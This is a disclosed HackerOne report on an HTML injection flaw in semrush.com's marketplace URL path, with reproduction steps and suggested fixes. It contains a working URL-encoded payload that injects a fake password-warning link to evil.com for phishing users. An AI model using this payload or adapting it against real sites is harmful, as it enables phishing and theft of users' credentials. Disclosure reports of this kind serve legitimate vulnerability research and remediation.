# Code injection in https://www.semrush.com

## Report Details
- **Report ID**: 723707
- **URL**: https://hackerone.com/reports/723707
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-27T18:21:40.285Z
- **Disclosed**: 2019-11-01T14:18:09.093Z

## Reporter
- **Username**: dangkhai0x21
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
##INTRODUCES:
-With a direct error on the homepage, it is easy to trick the victim into accessing a fake page from the attacker

##STEP:
Step: Send url with payload to victim:
https://www.semrush.com/marketplace/%22%0D%0A/%3E%3Ch1%3E%3Ca%20href%3Dhttps://evil.com%3EYour%20password%20is%20currently%20unsafe,%20please%20click%20the%20link%20to%20update%20the%20information%3C/a%3E%3C/h1%3E/

==> Victim enter link and open redirect to evil.com , Attacker can phishing to Retrieve user information.

##FIX:
-Whitelist
-Filter "<"

## Impact

- Fake notification.
- Open redirect

## Attachments
No attachments
